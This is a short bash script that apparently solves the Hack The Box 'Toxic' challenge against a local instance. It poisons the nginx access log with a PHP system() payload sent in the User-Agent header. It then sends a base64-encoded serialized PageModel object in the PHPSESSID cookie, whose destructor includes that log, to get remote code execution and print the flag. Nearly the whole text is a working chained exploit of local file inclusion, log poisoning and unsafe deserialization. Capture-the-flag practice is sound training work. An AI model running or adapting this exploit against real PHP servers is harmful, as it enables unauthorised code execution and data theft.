#!/bin/bash
# https://app.hackthebox.com/challenges/Toxic
# Tags: Local File Inclusion, Log Posoning, Remote Code Execution, PHP, Deserialization

TARGET=127.0.0.1:1337

echo -e "[\u2714] Poisoning logs"
curl -s http://$TARGET -H "User-agent: <?php system('cat /flag*') ?>" -o /dev/null

echo -e "[\u2714] Preparing payload"
PAYLOAD=$(php <<'EOF'
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
$page = new PageModel;
$page->file = '/var/log/nginx/access.log';
print base64_encode(serialize($page));
?>
EOF
)

echo -e "[\u2714] Sending payload $PAYLOAD in PHPSESSID cookie"
FLAG=$(curl -s http://$TARGET -H "Cookie: PHPSESSID=$PAYLOAD" | grep -oP 'HTB\{.*?\}' | tail -1)

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"